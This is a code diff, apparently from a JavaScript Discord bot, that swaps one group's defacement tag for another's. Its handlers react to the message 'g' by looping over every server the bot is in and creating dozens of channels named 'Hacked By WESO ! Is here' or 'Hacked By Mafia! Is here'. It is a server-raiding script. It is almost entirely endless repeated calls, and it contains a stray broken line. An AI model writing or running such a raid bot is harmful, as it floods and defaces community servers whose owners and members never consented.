+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
 
 
 
@@ -864,626 +863,80 @@ m.createChannel('Hacked By Mafia! Is here', 'text');
 hngel.on('message', message => {
          if (message.content === "g") {
                  hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-                   
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
 m.createChannel('  Hacked By WESO ! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
